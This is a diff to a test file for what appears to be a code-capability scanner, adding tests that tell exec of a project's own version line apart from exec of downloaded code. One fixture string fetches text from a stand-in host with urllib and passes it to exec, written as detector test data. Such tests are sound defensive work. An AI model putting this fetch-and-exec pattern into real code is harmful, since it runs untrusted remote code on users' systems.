@@ -411,5 +411,19 @@ class TestPersistenceThroughAnAssembledPath:
 
     def test_reading_a_profile_is_not(self) -> None:
         assert not any(
-            c is Capability.PERSIST for c, _ in _capabilities("open('/home/u/.pro' 'file').read()\n")
+            c is Capability.PERSIST
+            for c, _ in _capabilities("open('/home/u/.pro' 'file').read()\n")
         )
+
+
+class TestExecOfTheProjectsOwnFile:
+    def test_reading_a_version_line_is_not_execution(self) -> None:
+        source = (
+            "D = {}\nfor l in open('src/pkg/__init__.py').readlines():\n"
+            "    if l.startswith('Version'):\n        exec(l.strip(), D)\n"
+        )
+        assert not any(c is Capability.EXECUTE for c, _ in _capabilities(source))
+
+    def test_exec_of_a_download_still_is(self) -> None:
+        source = "import urllib.request\nt = urllib.request.urlopen('https://h.invalid').read()\nexec(t)\n"
+        assert any(c is Capability.EXECUTE for c, _ in _capabilities(source))
